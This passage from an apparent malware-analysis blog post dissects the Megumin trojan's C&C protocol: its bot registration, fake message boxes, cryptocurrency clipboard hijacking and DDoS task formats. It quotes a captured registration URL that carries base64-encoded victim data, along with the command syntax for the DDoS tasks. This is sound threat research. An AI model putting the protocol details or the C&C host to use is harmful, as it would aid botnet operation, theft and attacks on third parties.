<p><img data-recalc-dims="1" loading="lazy" decoding="async" data-attachment-id="714" data-permalink="https://fumik0.com/2019/05/03/lets-nuke-megumin-trojan/megumin_path/" data-orig-file="https://i0.wp.com/fumik0.com/wp-content/uploads/2019/05/megumin_path.png?fit=822%2C69&amp;ssl=1" data-orig-size="822,69" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="megumin_path" data-image-description="" data-image-caption="" data-medium-file="https://i0.wp.com/fumik0.com/wp-content/uploads/2019/05/megumin_path.png?fit=300%2C25&amp;ssl=1" data-large-file="https://i0.wp.com/fumik0.com/wp-content/uploads/2019/05/megumin_path.png?fit=822%2C69&amp;ssl=1" class="alignnone size-full wp-image-714" src="https://i0.wp.com/fumik0.com/wp-content/uploads/2019/05/megumin_path.png?resize=822%2C69&#038;ssl=1" alt="megumin_path" width="822" height="69" srcset="https://i0.wp.com/fumik0.com/wp-content/uploads/2019/05/megumin_path.png?w=822&amp;ssl=1 822w, https://i0.wp.com/fumik0.com/wp-content/uploads/2019/05/megumin_path.png?resize=300%2C25&amp;ssl=1 300w, https://i0.wp.com/fumik0.com/wp-content/uploads/2019/05/megumin_path.png?resize=768%2C64&amp;ssl=1 768w" sizes="auto, (max-width: 822px) 100vw, 822px" /></p>
<p>Arkei</p>
<p><img data-recalc-dims="1" loading="lazy" decoding="async" data-attachment-id="713" data-permalink="https://fumik0.com/2019/05/03/lets-nuke-megumin-trojan/megumin_arkei/" data-orig-file="https://i0.wp.com/fumik0.com/wp-content/uploads/2019/05/megumin_arkei-3591253521-1556877257331.png?fit=844%2C56&amp;ssl=1" data-orig-size="844,56" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="megumin_arkei" data-image-description="" data-image-caption="" data-medium-file="https://i0.wp.com/fumik0.com/wp-content/uploads/2019/05/megumin_arkei-3591253521-1556877257331.png?fit=300%2C20&amp;ssl=1" data-large-file="https://i0.wp.com/fumik0.com/wp-content/uploads/2019/05/megumin_arkei-3591253521-1556877257331.png?fit=844%2C56&amp;ssl=1" class="alignnone size-full wp-image-713" src="https://i0.wp.com/fumik0.com/wp-content/uploads/2019/05/megumin_arkei-3591253521-1556877257331.png?resize=844%2C56&#038;ssl=1" alt="megumin_arkei" width="844" height="56" srcset="https://i0.wp.com/fumik0.com/wp-content/uploads/2019/05/megumin_arkei-3591253521-1556877257331.png?w=844&amp;ssl=1 844w, https://i0.wp.com/fumik0.com/wp-content/uploads/2019/05/megumin_arkei-3591253521-1556877257331.png?resize=300%2C20&amp;ssl=1 300w, https://i0.wp.com/fumik0.com/wp-content/uploads/2019/05/megumin_arkei-3591253521-1556877257331.png?resize=768%2C51&amp;ssl=1 768w" sizes="auto, (max-width: 844px) 100vw, 844px" /></p>
<p>Rarog</p>
<p><img data-recalc-dims="1" loading="lazy" decoding="async" data-attachment-id="712" data-permalink="https://fumik0.com/2019/05/03/lets-nuke-megumin-trojan/megumin_rarog/" data-orig-file="https://i0.wp.com/fumik0.com/wp-content/uploads/2019/05/megumin_rarog.png?fit=731%2C107&amp;ssl=1" data-orig-size="731,107" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="megumin_rarog" data-image-description="" data-image-caption="" data-medium-file="https://i0.wp.com/fumik0.com/wp-content/uploads/2019/05/megumin_rarog.png?fit=300%2C44&amp;ssl=1" data-large-file="https://i0.wp.com/fumik0.com/wp-content/uploads/2019/05/megumin_rarog.png?fit=731%2C107&amp;ssl=1" class="alignnone size-full wp-image-712" src="https://i0.wp.com/fumik0.com/wp-content/uploads/2019/05/megumin_rarog.png?resize=731%2C107&#038;ssl=1" alt="megumin_rarog" width="731" height="107" srcset="https://i0.wp.com/fumik0.com/wp-content/uploads/2019/05/megumin_rarog.png?w=731&amp;ssl=1 731w, https://i0.wp.com/fumik0.com/wp-content/uploads/2019/05/megumin_rarog.png?resize=300%2C44&amp;ssl=1 300w" sizes="auto, (max-width: 731px) 100vw, 731px" /></p>
<h3>Step 2</h3>
<ul>
<li>reserv.exe is again downloaded, and considering the file is empty, so at that time, the correct build for communicating with the C&amp;C.</li>
<li>Those requests are performed
<ul>
<li>/suicide</li>
<li>/msgBox</li>
<li>/config</li>
</ul>
</li>
</ul>
<p>The config is the only request was the server is not encoding it in base64 format, there are 4 options possible.</p>
<table border="0" cellspacing="0">
<colgroup width="124"></colgroup>
<colgroup width="261"></colgroup>
<tbody>
<tr>
<td align="left" height="17">Option 1</td>
<td align="left">USB task (Spreading the build on removable drives)</td>
</tr>
<tr>
<td align="left" height="17">Option 2</td>
<td align="left">Clipper</td>
</tr>
<tr>
<td align="left" height="17">Option 3</td>
<td align="left">???</td>
</tr>
<tr>
<td align="left" height="17">Option 4</td>
<td align="left">???</td>
</tr>
</tbody>
</table>
<ul>
<li>A scheduled task is created with this specific pattern for the persistence and the name of the payload is at that time a random known legitimate windows process (also same thing on the registry).
<ul>
<li>&#8220;Scheduled Updater &#8211; {*MACHINE_GUID*}&#8221;</li>
</ul>
</li>
<li style="text-align: left;">Then the payload is killed and removed</li>
</ul>
<p>If this file is empty, it&#8217;s considered that it reached its final destination and its final C&amp;C, so seeing two Megumin C&amp;C on the same domain could be explainable by this (and It was the case on my side).</p>
<h3>Step 3</h3>
<ul>
<li>reserv.exe is always checked for checking if there is a new build</li>
<li>Now the behavior on the network flows is totally new. The bot is now way more talkative and is going to be fully set up and registered to the C&amp;C.
<ul>
<li>/suicide</li>
<li>/config</li>
<li>/addbot?hwid=&#8230;&amp;&#8230;.. # Registration</li>
<li>/blacklist</li>
<li>/wallets</li>
<li>/task?hwid=&#8230; # Performs a task</li>
<li>&#8230; a lot of possible tasks (explained below)</li>
<li>/completed?hwid=&#8230; # Alerting that the task is done</li>
<li>/reconnecttime</li>
</ul>
</li>
</ul>
<p>For the addbot part, the registration is requiring specific fields that will be all encoded in base64 format.</p>
<ul>
<li>Machine GUID</li>
<li>Platform</li>
<li>Windows version</li>
<li>CPU Name</li>
<li>GPU Name</li>
<li>Antivirus</li>
<li>Filename (name of the megumin payload)</li>
<li>Username</li>
</ul>
<p>example of request (Any.Run)</p>
<p><em><a href="http://90551.prohoster.biz/megumin/addbot?hwid=OTAwNTljMzctMTMyMC00MWE0LWI1OGQtMmI3NWE5ODUwZDJm&#038;bit=eDMy&#038;win=V2luZG93cyA3IFByb2Zlc3Npb25hbA==&#038;cpu=SW50ZWwoUikgQ29yZShUTSkgaTUtNjQwMCBDUFUgQCAyLjcwR0h6AAAAAAAAAAAA&#038;gpu=U3RhbmRhcmQgVkdBIEdyYXBoaWNzIEFkYXB0ZXI=&#038;av=VW5rbm93bg==&#038;filename=Y3Nyc3MuZXhl&#038;username=YWRtaW4=" rel="nofollow">http://90551.prohoster.biz/megumin/addbot?hwid=OTAwNTljMzctMTMyMC00MWE0LWI1OGQtMmI3NWE5ODUwZDJm&#038;bit=eDMy&#038;win=V2luZG93cyA3IFByb2Zlc3Npb25hbA==&#038;cpu=SW50ZWwoUikgQ29yZShUTSkgaTUtNjQwMCBDUFUgQCAyLjcwR0h6AAAAAAAAAAAA&#038;gpu=U3RhbmRhcmQgVkdBIEdyYXBoaWNzIEFkYXB0ZXI=&#038;av=VW5rbm93bg==&#038;filename=Y3Nyc3MuZXhl&#038;username=YWRtaW4=</a></em></p>
<h3>Step 4</h3>
<ul>
<li>reserv.exe is always checked for checking if there is a new build</li>
<li>If the bot is run after the registration, it will be possible to have this pattern of request
<ul>
<li>/suicide</li>
<li>/config</li>
<li>/task?hwid=&#8230; # Performs task</li>
<li>&#8230; a lot of possible tasks (explained below)</li>
<li>/completed?hwid=&#8230; # Alerting that the task is done</li>
<li>/reconnecttime</li>
</ul>
</li>
</ul>
<h2>Fake messages</h2>
<p>As shown above, the malware has also a feature to prompt a fake window and this could be used for making &#8220;some realistic scenario&#8221; of a typical fake software, crack or other crapware, lure the user during the execution that the software has been installed or there is an error during the false installation or execution. It&#8217;s really common to see nowadays fake prompt window for missing runtime DLL, or fake Fortnite hack or whatever Free Bitcoin trap generator, this kind of lure will always work in some kind of people, even more with kids.</p>
<p>For configuring the feature, the bot is sending a specific HTTP POST Request named &#8220;/msgbox&#8221; and After decoding the base64 response from the server the response is split into multiple variables :</p>
<ul>
<li>An integer value that will represent the Icon of the Window</li>
<li>A second int value that will represent the buttons that will be used</li>
<li>The caption (Title)</li>
<li>The text that will be printed on the prompt window</li>
</ul>
<p><img data-recalc-dims="1" loading="lazy" decoding="async" data-attachment-id="691" data-permalink="https://fumik0.com/2019/05/03/lets-nuke-megumin-trojan/megumin_msgbox-2/" data-orig-file="https://i0.wp.com/fumik0.com/wp-content/uploads/2019/05/megumin_msgbox-1.png?fit=1003%2C333&amp;ssl=1" data-orig-size="1003,333" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="megumin_msgbox" data-image-description="" data-image-caption="" data-medium-file="https://i0.wp.com/fumik0.com/wp-content/uploads/2019/05/megumin_msgbox-1.png?fit=300%2C100&amp;ssl=1" data-large-file="https://i0.wp.com/fumik0.com/wp-content/uploads/2019/05/megumin_msgbox-1.png?fit=900%2C299&amp;ssl=1" class="alignnone size-full wp-image-691" src="https://i0.wp.com/fumik0.com/wp-content/uploads/2019/05/megumin_msgbox-1.png?resize=900%2C299&#038;ssl=1" alt="megumin_msgbox" width="900" height="299" srcset="https://i0.wp.com/fumik0.com/wp-content/uploads/2019/05/megumin_msgbox-1.png?w=1003&amp;ssl=1 1003w, https://i0.wp.com/fumik0.com/wp-content/uploads/2019/05/megumin_msgbox-1.png?resize=300%2C100&amp;ssl=1 300w, https://i0.wp.com/fumik0.com/wp-content/uploads/2019/05/megumin_msgbox-1.png?resize=768%2C255&amp;ssl=1 768w" sizes="auto, (max-width: 900px) 100vw, 900px" /></p>
<p>Corresponding case input codes with the configuration of the prompt window are classified below:</p>
<p>uType &#8211; Uint Code &#8211; Icons &#8211; cases</p>
<table border="0" cellspacing="0">
<colgroup width="124"></colgroup>
<colgroup width="261"></colgroup>
<colgroup width="274"></colgroup>
<tbody>
<tr>
<td style="text-align: left;" align="center" height="17">Case Code</td>
<td style="text-align: left;" align="center">Value</td>
<td style="text-align: left;" align="center">Meaning</td>
</tr>
<tr>
<td style="text-align: left;" align="right" height="17">1</td>
<td style="text-align: left;" align="right">0x00000020L</td>
<td style="text-align: left;" align="right">Question-mark message box</td>
</tr>
<tr>
<td style="text-align: left;" align="right" height="17">2</td>
<td align="right">0x00000030L</td>
<td align="right">Information message box</td>
</tr>
<tr>
<td style="text-align: left;" align="right" height="17">3</td>
<td style="text-align: left;" align="right">0x00000040L</td>
<td style="text-align: left;" align="right">Warning message box</td>
</tr>
</tbody>
</table>
<p>uType &#8211; Uint Code &#8211; Buttons &#8211; cases</p>
<table border="0" cellspacing="0">
<colgroup width="124"></colgroup>
<colgroup width="261"></colgroup>
<colgroup width="274"></colgroup>
<tbody>
<tr>
<td style="text-align: left;" align="center" height="17">Case Code</td>
<td style="text-align: left;" align="center">Value</td>
<td style="text-align: left;" align="center">Meaning</td>
</tr>
<tr>
<td style="text-align: left;" align="right" height="17">0</td>
<td style="text-align: left;" align="left">0x00000002L</td>
<td style="text-align: left;" align="left">Abort, Retry &amp; Ignore buttons</td>
</tr>
<tr>
<td style="text-align: left;" align="right" height="17">1</td>
<td align="left">0x00000006L</td>
<td align="left">Cancer, Try Again, Continue buttons</td>
</tr>
<tr>
<td style="text-align: left;" align="right" height="17">2</td>
<td align="left">0x00004000L</td>
<td align="left">Help button</td>
</tr>
<tr>
<td style="text-align: left;" align="right" height="17">3</td>
<td align="left">0x00000000L</td>
<td align="left">OK button</td>
</tr>
<tr>
<td style="text-align: left;" align="right" height="17">4</td>
<td align="left">0x00000001L</td>
<td align="left">OK &amp; Cancel buttons</td>
</tr>
<tr>
<td style="text-align: left;" align="right" height="17">5</td>
<td align="left">0x00000005L</td>
<td align="left">Retry &amp; Cancel buttons</td>
</tr>
<tr>
<td style="text-align: left;" align="right" height="17">6</td>
<td align="left">0x00000004L</td>
<td align="left">Yes &amp; No buttons</td>
</tr>
<tr>
<td style="text-align: left;" align="right" height="17">7</td>
<td style="text-align: left;" align="left">0x00000003L</td>
<td style="text-align: left;" align="left">Yes, No &amp; Cancel buttons</td>
</tr>
</tbody>
</table>
<h2>Clipper</h2>
<p>Before that the malware is executing the main module, all the regexes that will be used for catching the whished data are stored dynamically into memory.</p>
<p><img data-recalc-dims="1" loading="lazy" decoding="async" data-attachment-id="694" data-permalink="https://fumik0.com/2019/05/03/lets-nuke-megumin-trojan/megumin_clipper_regex/" data-orig-file="https://i0.wp.com/fumik0.com/wp-content/uploads/2019/05/megumin_clipper_regex.png?fit=671%2C106&amp;ssl=1" data-orig-size="671,106" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="megumin_clipper_regex" data-image-description="" data-image-caption="" data-medium-file="https://i0.wp.com/fumik0.com/wp-content/uploads/2019/05/megumin_clipper_regex.png?fit=300%2C47&amp;ssl=1" data-large-file="https://i0.wp.com/fumik0.com/wp-content/uploads/2019/05/megumin_clipper_regex.png?fit=671%2C106&amp;ssl=1" class="alignnone size-full wp-image-694" src="https://i0.wp.com/fumik0.com/wp-content/uploads/2019/05/megumin_clipper_regex.png?resize=671%2C106&#038;ssl=1" alt="megumin_clipper_regex" width="671" height="106" srcset="https://i0.wp.com/fumik0.com/wp-content/uploads/2019/05/megumin_clipper_regex.png?w=671&amp;ssl=1 671w, https://i0.wp.com/fumik0.com/wp-content/uploads/2019/05/megumin_clipper_regex.png?resize=300%2C47&amp;ssl=1 300w" sizes="auto, (max-width: 671px) 100vw, 671px" /></p>
<p>Then when the malware is fully installed if the clipping feature is activated by the config request, another one called &#8220;/wallet&#8221; is performed. This command gives to the bot the list of all wallet configured to be clipped. the content is base64 encoded.</p>
<p>At this point,  the classy infinite loop like <a href="https://fumik0.com/2019/03/25/lets-play-with-qulab-an-exotic-malware-developed-in-autoit/">Qulab</a> is performed and will remain the same until the program is killed or crashed.</p>
<ol>
<li>The content of the clipboard is stored into a variable.</li>
<li>Step by step, all regexes are checking if it matches with the clipboard.</li>
<li>If one regex triggers something, the content on the clipboard is switched by the one that the attacker wants and some data are sent to the C&amp;C.</li>
</ol>
<pre>/newclip?hwid=XXX&amp;type=XXX&amp;copy=XXX&amp;paste=XXX&amp;date=XXX</pre>
<p>The whole process of the clipper is representing like this.</p>
<p><img data-recalc-dims="1" loading="lazy" decoding="async" data-attachment-id="693" data-permalink="https://fumik0.com/2019/05/03/lets-nuke-megumin-trojan/megumin_clipper_window/" data-orig-file="https://i0.wp.com/fumik0.com/wp-content/uploads/2019/05/megumin_clipper_window.png?fit=570%2C833&amp;ssl=1" data-orig-size="570,833" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="megumin_clipper_window" data-image-description="" data-image-caption="" data-medium-file="https://i0.wp.com/fumik0.com/wp-content/uploads/2019/05/megumin_clipper_window.png?fit=205%2C300&amp;ssl=1" data-large-file="https://i0.wp.com/fumik0.com/wp-content/uploads/2019/05/megumin_clipper_window.png?fit=570%2C833&amp;ssl=1" class=" size-full wp-image-693 alignleft" src="https://i0.wp.com/fumik0.com/wp-content/uploads/2019/05/megumin_clipper_window.png?resize=570%2C833&#038;ssl=1" alt="megumin_clipper_window" width="570" height="833" srcset="https://i0.wp.com/fumik0.com/wp-content/uploads/2019/05/megumin_clipper_window.png?w=570&amp;ssl=1 570w, https://i0.wp.com/fumik0.com/wp-content/uploads/2019/05/megumin_clipper_window.png?resize=205%2C300&amp;ssl=1 205w" sizes="auto, (max-width: 570px) 100vw, 570px" /></p>
<p>&nbsp;</p>
<p>&nbsp;</p>
<p>&nbsp;</p>
<p>&nbsp;</p>
<p>&nbsp;</p>
<p>&nbsp;</p>
<p>&nbsp;</p>
<p>&nbsp;</p>
<p>&nbsp;</p>
<p>&nbsp;</p>
<p>&nbsp;</p>
<p>&nbsp;</p>
<p>&nbsp;</p>
<p>&nbsp;</p>
<p>&nbsp;</p>
<p>&nbsp;</p>
<p>&nbsp;</p>
<p>&nbsp;</p>
<p>For some investigation, this is the complete list of wallets, softwares, and websites targeted by this malware.</p>
<table border="0" cellspacing="0">
<colgroup span="4" width="85"></colgroup>
<tbody>
<tr>
<td align="left" height="17">Bitcoin</td>
<td align="left">BitcoinGold</td>
<td align="left">BtcCash</td>
<td align="left">Ethereum</td>
</tr>
<tr>
<td align="left" height="17">BlackCoin</td>
<td align="left">ByteCoin</td>
<td align="left">EmerCoin</td>
<td align="left">ReddCoin</td>
</tr>
<tr>
<td align="left" height="17">Peercoin</td>
<td align="left">Ripple</td>
<td align="left">Miota</td>
<td align="left">Cardano</td>
</tr>
<tr>
<td align="left" height="17">Lisk</td>
<td align="left">Stratis</td>
<td align="left">Waves</td>
<td align="left">Qtum</td>
</tr>
<tr>
<td align="left" height="17">Stellar</td>
<td align="left">ViaCoin</td>
<td align="left">Electroneum</td>
<td align="left">Dash</td>
</tr>
<tr>
<td align="left" height="17">Doge</td>
<td align="left">LiteCoin</td>
<td align="left">Monero</td>
<td align="left">Graft</td>
</tr>
<tr>
<td align="left" height="17">ZCash</td>
<td align="left">Ya.money</td>
<td align="left">Ya.disc</td>
<td align="left">Steam</td>
</tr>
<tr>
<td align="left" height="17">vk.cc</td>
<td align="left">QIWI</td>
<td align="left"></td>
<td align="left"></td>
</tr>
</tbody>
</table>
<h2>Tasks</h2>
<p>When the bot is sending a request to the C&amp;C, there is a possibility to have nine different tasks to be performed and they are all presenting like this.</p>
<pre>&lt;name&gt;|&lt;command&gt;|...</pre>
<p>There are currently 3 main fields for the tasks.</p>
<ul>
<li>DDoS</li>
<li>Executing files</li>
<li>Miscellaneous</li>
</ul>
<p>Whenever a task is accomplished, the request &#8220;/completed?hwid=&#8221; is sent to the C&amp;C. The reason for this is simple, tasks can be counted and when it reaches a specific amount, the task is simply deactivated.</p>
<p>Let&#8217;s reviewing them!</p>
<p><img data-recalc-dims="1" loading="lazy" decoding="async" data-attachment-id="679" data-permalink="https://fumik0.com/2019/05/03/lets-nuke-megumin-trojan/megumin_task_answers/" data-orig-file="https://i0.wp.com/fumik0.com/wp-content/uploads/2019/04/megumin_task_answers-208016716-1556664112840.png?fit=531%2C832&amp;ssl=1" data-orig-size="531,832" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="megumin_task_answers" data-image-description="" data-image-caption="" data-medium-file="https://i0.wp.com/fumik0.com/wp-content/uploads/2019/04/megumin_task_answers-208016716-1556664112840.png?fit=191%2C300&amp;ssl=1" data-large-file="https://i0.wp.com/fumik0.com/wp-content/uploads/2019/04/megumin_task_answers-208016716-1556664112840.png?fit=531%2C832&amp;ssl=1" class=" size-full wp-image-679 alignnone" src="https://i0.wp.com/fumik0.com/wp-content/uploads/2019/04/megumin_task_answers-208016716-1556664112840.png?resize=531%2C832&#038;ssl=1" alt="megumin_task_answers.png" width="531" height="832" srcset="https://i0.wp.com/fumik0.com/wp-content/uploads/2019/04/megumin_task_answers-208016716-1556664112840.png?w=531&amp;ssl=1 531w, https://i0.wp.com/fumik0.com/wp-content/uploads/2019/04/megumin_task_answers-208016716-1556664112840.png?resize=191%2C300&amp;ssl=1 191w" sizes="auto, (max-width: 531px) 100vw, 531px" /></p>
<h3>DDoS</h3>
<h4>Socket HTTP</h4>
<p>Task format</p>
<pre>socket|time|threads|link</pre>
<p>When there is a necessity to create <a href="https://docs.microsoft.com/en-us/windows/desktop/api/processthreadsapi/nf-processthreadsapi-createthread">threads</a> for performing the DDoS tasks, it only grabs the specific fields and using it a length for a thread loop creation as shown below, lpStartAddress will contain the reference of the specific DDoS function that the bot has to do.</p>
<p><img data-recalc-dims="1" loading="lazy" decoding="async" data-attachment-id="685" data-permalink="https://fumik0.com/2019/05/03/lets-nuke-megumin-trojan/megumin_ddos_socket_threads/" data-orig-file="https://i0.wp.com/fumik0.com/wp-content/uploads/2019/05/megumin_ddos_socket_threads.png?fit=663%2C400&amp;ssl=1" data-orig-size="663,400" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="megumin_ddos_socket_threads" data-image-description="" data-image-caption="" data-medium-file="https://i0.wp.com/fumik0.com/wp-content/uploads/2019/05/megumin_ddos_socket_threads.png?fit=300%2C181&amp;ssl=1" data-large-file="https://i0.wp.com/fumik0.com/wp-content/uploads/2019/05/megumin_ddos_socket_threads.png?fit=663%2C400&amp;ssl=1" class="alignnone size-full wp-image-685" src="https://i0.wp.com/fumik0.com/wp-content/uploads/2019/05/megumin_ddos_socket_threads.png?resize=663%2C400&#038;ssl=1" alt="megumin_ddos_socket_threads" width="663" height="400" srcset="https://i0.wp.com/fumik0.com/wp-content/uploads/2019/05/megumin_ddos_socket_threads.png?w=663&amp;ssl=1 663w, https://i0.wp.com/fumik0.com/wp-content/uploads/2019/05/megumin_ddos_socket_threads.png?resize=300%2C181&amp;ssl=1 300w" sizes="auto, (max-width: 663px) 100vw, 663px" /></p>
<p>When inspecting it the function, we can see the layer 7 DDoS Attack by flooding the server by HTTP GET requests with the help of sockets.</p>
<p><img data-recalc-dims="1" loading="lazy" decoding="async" data-attachment-id="686" data-permalink="https://fumik0.com/2019/05/03/lets-nuke-megumin-trojan/megumin_ddos_socket/" data-orig-file="https://i0.wp.com/fumik0.com/wp-content/uploads/2019/05/megumin_ddos_socket.png?fit=680%2C395&amp;ssl=1" data-orig-size="680,395" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="megumin_ddos_socket" data-image-description="" data-image-caption="" data-medium-file="https://i0.wp.com/fumik0.com/wp-content/uploads/2019/05/megumin_ddos_socket.png?fit=300%2C174&amp;ssl=1" data-large-file="https://i0.wp.com/fumik0.com/wp-content/uploads/2019/05/megumin_ddos_socket.png?fit=680%2C395&amp;ssl=1" class="alignnone size-full wp-image-686" src="https://i0.wp.com/fumik0.com/wp-content/uploads/2019/05/megumin_ddos_socket.png?resize=680%2C395&#038;ssl=1" alt="megumin_ddos_socket" width="680" height="395" srcset="https://i0.wp.com/fumik0.com/wp-content/uploads/2019/05/megumin_ddos_socket.png?w=680&amp;ssl=1 680w, https://i0.wp.com/fumik0.com/wp-content/uploads/2019/05/megumin_ddos_socket.png?resize=300%2C174&amp;ssl=1 300w" sizes="auto, (max-width: 680px) 100vw, 680px" /></p>
<p>When everything is configured, the <a href="https://docs.microsoft.com/en-us/windows/desktop/api/winsock2/nf-winsock2-send">send</a> function is called for starting the DDoS.</p>
<h4><img data-recalc-dims="1" loading="lazy" decoding="async" data-attachment-id="687" data-permalink="https://fumik0.com/2019/05/03/lets-nuke-megumin-trojan/megumin_ddos_socket_02/" data-orig-file="https://i0.wp.com/fumik0.com/wp-content/uploads/2019/05/megumin_ddos_socket_02.png?fit=599%2C131&amp;ssl=1" data-orig-size="599,131" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="megumin_ddos_socket_02" data-image-description="" data-image-caption="" data-medium-file="https://i0.wp.com/fumik0.com/wp-content/uploads/2019/05/megumin_ddos_socket_02.png?fit=300%2C66&amp;ssl=1" data-large-file="https://i0.wp.com/fumik0.com/wp-content/uploads/2019/05/megumin_ddos_socket_02.png?fit=599%2C131&amp;ssl=1" class="alignnone size-full wp-image-687" src="https://i0.wp.com/fumik0.com/wp-content/uploads/2019/05/megumin_ddos_socket_02.png?resize=599%2C131&#038;ssl=1" alt="megumin_ddos_socket_02" width="599" height="131" srcset="https://i0.wp.com/fumik0.com/wp-content/uploads/2019/05/megumin_ddos_socket_02.png?w=599&amp;ssl=1 599w, https://i0.wp.com/fumik0.com/wp-content/uploads/2019/05/megumin_ddos_socket_02.png?resize=300%2C66&amp;ssl=1 300w" sizes="auto, (max-width: 599px) 100vw, 599px" /></h4>
<h4>HTTP</h4>
<p>Task format</p>
<pre>http|time|threads|link</pre>
<p>As explained above, the technique will remain always the same for the thread setup, only the function addressed is different. For the HTTP DDoS task, it&#8217;s another Layer 7 DDoS Attack by flooding the server with HTTP requests by using the methods from the Wininet library :</p>
<ul>
<li><a href="https://docs.microsoft.com/en-us/windows/desktop/api/wininet/nf-wininet-internetopena">InternetOpenA</a></li>
<li><a href="https://docs.microsoft.com/en-us/windows/desktop/api/wininet/nf-wininet-internetconnecta">InternetConnectA</a></li>
<li><a href="https://docs.microsoft.com/en-us/windows/desktop/api/wininet/nf-wininet-httpopenrequesta">HttpOpenRequestA</a></li>
</ul>
<p>It&#8217;s slower than the &#8220;socket&#8221; tasks, but it used for the case that the server is using 301 redirects.</p>
<h4>TCP</h4>
<p>Task format</p>
<pre>tcp|time|threads|port|link</pre>
<p>The TCP task is Layer 4 DDoS Attack, by performing spreading the server TCP sockets requests with a specified port.</p>
